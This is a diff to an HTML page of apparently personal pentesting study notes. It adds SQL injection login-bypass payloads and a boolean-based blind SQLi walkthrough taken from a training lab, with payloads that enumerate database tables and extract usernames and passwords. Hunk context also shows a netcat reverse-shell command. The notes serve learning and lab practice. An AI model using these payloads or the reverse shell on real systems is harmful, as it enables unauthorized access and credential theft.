@@ -320,6 +320,10 @@ nc -e /bin/sh 10.20.14 8080<br>
     <p><ol>Some simple SQL command: <ol>1. database()  -- To see database name.</ol>
                                     <ol>2. </ol>
     </ol></p>
+    <h3>Bypass Authenitcation with SQL injection</h3>
+    <p>bypass common auth vulnerability using: <i>' OR 1=1;-- </i></p>
+    <p>bypass common auth vulnerability using: <i>' OR 1=1# </i></p>
+    <p>*** sometimes some characters are filted. In that case, sent modified payload using burp proxy</p>
     <h3>Exploit error-based SQL injection</h3>
     <p>use <i>ORDER BY [random_number]</i> -- To check how many columns exist on that database.<br>
     use <i>UNION SELECT [col1,col2,...]</i> -- To see vulnerable columns.<br>
@@ -328,16 +332,34 @@ nc -e /bin/sh 10.20.14 8080<br>
     use <i>UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '[table_name]'</i> -- To see table first column data.<br>
     use <i>UNION SELECT 1,2,group_concat([col_name1,':',col_name2,SEPARATOR '&lt;br&gt;') FROM [table_name]</i> -- To see target columns data.<br>
   </p>
-   <p>bypass common auth vulnerability using: <i>' OR 1=1;-- </i></p>
+  
    <h3>Exploit boolean-based SQL injection</h3>
-   <p>admin123' UNION SELECT 1,2,3 where database() like '%';--
-    admin123' UNION SELECT 1,2,3 where database() like 's%';--
-    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
-    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
-    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
-    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
-    admin123' UNION SELECT 1,2,3 from users where username like 'a%
-    admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+   <p><b>Boolean Based</b><br>
+    Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.
+    <br><br><br>
+    <b>Practical:</b>
+    <br><br>
+    On level three of the SQL Injection Examples Machine, you're presented with a mock browser with the following URL:
+    <br><br>
+    https://website.thm/checkuser?username=admin
+    <br><br>
+    The browser body contains the contents of {"taken":true}. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. In fact, we can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.
+    <br>
+    The SQL query that is processed looks like the following:
+    <br><br>
+    select * from users where username = '%username%' LIMIT 1;
+    <br><br>
+    As the only input, we have control over is the username in the query string, we'll have to use this to perform our SQL Injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, which will change the state of the taken field from false to true.
+    <br>
+    Like in previous levels, our first task is to establish the number of columns in the users table, which we can achieve by using the UNION statement. Change the username value to the following:</p>
+   <p>admin123' UNION SELECT 1,2,3 where database() like '%';-- <br>
+    admin123' UNION SELECT 1,2,3 where database() like 's%';--<br>
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--<br>
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--<br>
+    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';<br>
+    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';<br>
+    admin123' UNION SELECT 1,2,3 from users where username like 'a%<br>
+    admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%<br>
     
    </p>
     </div>
